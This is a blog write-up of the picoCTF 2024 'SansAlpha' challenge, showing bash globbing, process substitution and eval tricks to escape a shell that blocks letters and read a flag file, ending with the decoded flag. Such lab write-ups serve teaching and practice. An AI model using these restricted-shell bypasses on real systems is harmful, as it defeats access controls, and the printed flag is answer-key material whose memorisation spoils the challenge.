---
title: 'SansAlpha'
date: '2025-11-07T00:00:00+08:00'
lastmod: '2025-11-07T00:00:00+08:00'
draft: false
description: 'The Multiverse is within your grasp! Unfortunately, the server that contains the secrets of the multiverse is in a universe where keyboards only have numbers and (most) symbols.'
summary: ''
tags: ["Medium", "General Skills", "picoCTF 2024"]
categories: []
series: []
author: "Zeus Dela Cruz"
tools: ["ssh", "base64", "bash"]
techniques: ["Shell Escape", "Bash Globbing", "Restricted Shell Bypass"]

# Enable features for post
showToc: true
TocOpen: false
hidemeta: false
comments: false
disableShare: false
disableHLJS: false
searchHidden: false
ShowReadingTime: true
ShowWordCount: true
ShowCodeCopyButtons: true

# Cover image (optional)
cover:
  image: '' # /images/filename.jpg
  alt: ''
  caption: ''
  relative: false
  hidden: false
  hiddenInList: false
  hiddenInSingle: false

# Canonical link (for SEO)
canonicalURL: ''

# External edit link
editPost:
  URL: "https://github.com/freymeyer/myportfolio/tree/main/content"
  Text: "Suggest Changes"
  appendFilePath: true
---

## Challenge Information

This challenge presents a unique twist: you're dropped into a restricted shell environment where the keyboard only has numbers and most symbols available. The challenge is to execute commands and retrieve the flag without using any alphabetic characters.

**Connection Details:**
```bash
ssh -p 59139 ctf-player@mimas.picoctf.net
```

## Understanding the Restriction

Upon connecting to the server, you're greeted with a restricted shell prompt:
```
SansAlpha$
```

The key constraint here is that **no alphabetic characters are allowed**. Any attempt to use letters results in an error:
```
SansAlpha: Unknown character detected
```

This means we can only use:
- Numbers (0-9)
- Special characters and symbols
- Bash syntax (wildcards, variables, etc.)

## Solution Strategy

The solution leverages **bash globbing** (wildcard patterns) to find and execute commands without typing their names directly.

### Step 1: Finding the base64 Command

First, we need to locate the `base64` utility using wildcards:

```bash
_1=(/???/????64)
```

**Breaking this down:**
- `/???/` matches three-character directory names (like `/bin/`, `/usr/`)
- `????64` matches any four characters followed by "64" (matching `base64`)
- The result is stored in an array variable `_1`

This glob pattern searches the filesystem and finds `/usr/bin/base64` without typing any letters!

### Step 2: Executing base64 on the Flag File

Next, we execute the base64 command on a file containing the flag:

```bash
"${_1[0]}" */????.???
```

**Breaking this down:**
- `"${_1[0]}"` expands to the first element of our array (the path to base64)
- `*/????.???` is a glob pattern matching files in subdirectories
  - `*/` matches any subdirectory
  - `????.???` matches files with 4 characters, a dot, and 3 more characters (like `blargh/flag.txt`)

This command effectively runs: `base64 [some_directory]/flag.txt`

### Step 3: The Encoded Output

The command returns base64-encoded data:
```
cmV0dXJuIDAgcGljb0NURns3aDE1X211MTcxdjNyNTNfMTVfbTRkbjM1NV9iMGQ1ZTg1NX0=
```

### Step 4: Decoding the Flag

To decode this, you can use any base64 decoder outside the restricted shell:

```bash
echo "cmV0dXJuIDAgcGljb0NURns3aDE1X211MTcxdjNyNTNfMTVfbTRkbjM1NV9iMGQ1ZTg1NX0=" | base64 -d
```

Result:
```
return 0 picoCTF{7h15_mu171v3r53_15_m4dn355_b0d5e855}
```

## Alternative Approaches

The beauty of this challenge is that there are multiple ways to solve it using different bash techniques:

### Method 1: Using Process Substitution
```bash
. <(${_1[0]} */????.???)
```

### Method 2: Direct Execution with eval
```bash
_2=$(${_1[0]} */????.???)
${_2}
```

### Method 3: Finding Other Utilities
You could also find other utilities like `cat`, `head`, or `tail` using similar globbing:
```bash
_3=(/???/???)
"${_3[X]}" */????.???
```
(Where X is the index of the utility you want)

## Complete Solution Walkthrough

```bash
# Connect to the challenge server
ssh -p 59139 ctf-player@mimas.picoctf.net

# At the SansAlpha$ prompt:

# Find base64 command using wildcards
SansAlpha$ _1=(/???/????64)

# Execute base64 on the flag file
SansAlpha$ "${_1[0]}" */????.???
cmV0dXJuIDAgcGljb0NURns3aDE1X211MTcxdjNyNTNfMTVfbTRkbjM1NV9iMGQ1ZTg1NX0=

# Decode locally (outside the restricted shell)
$ echo "cmV0dXJuIDAgcGljb0NURns3aDE1X211MTcxdjNyNTNfMTVfbTRkbjM1NV9iMGQ1ZTg1NX0=" | base64 -d
return 0 picoCTF{7h15_mu171v3r53_15_m4dn355_b0d5e855}
```

## Summary

1. **Restricted Shell** → Connected to SSH server with alphabet-disabled shell
2. **Bash Globbing** → Used wildcards `/???/????64` to locate base64 command
3. **Variable Storage** → Stored command path in variable `_1`
4. **File Execution** → Used `"${_1[0]}" */????.???` to run base64 on flag file
5. **Base64 Decode** → Decoded output locally to reveal the flag

## Key Takeaways

- Bash globbing is extremely powerful and can be used to bypass input restrictions
- Wildcards (`?`, `*`, `[]`) can match filenames and paths without knowing exact names
- Array variables in bash can store results from glob expansions
- Restricted shells can often be bypassed using creative bash syntax
- Understanding the filesystem structure (`/bin`, `/usr/bin`, etc.) helps in crafting effective globs
- Base64 encoding is commonly used for data transfer in CTF challenges

## Important Bash Concepts Used

**Globbing Wildcards:**
- `?` - Matches exactly one character
- `*` - Matches zero or more characters
- `[...]` - Matches any character in brackets

**Variable Expansion:**
- `_1=(...)` - Creates an array variable
- `${_1[0]}` - Accesses first element of array
- `"${...}"` - Properly quotes variable expansion

**Filesystem Knowledge:**
- `/bin/` - Basic command binaries
- `/usr/bin/` - User command binaries
- Common utilities: base64, cat, less, head, tail

## Flag

```
picoCTF{7h15_mu171v3r53_15_m4dn355_b0d5e855}
```
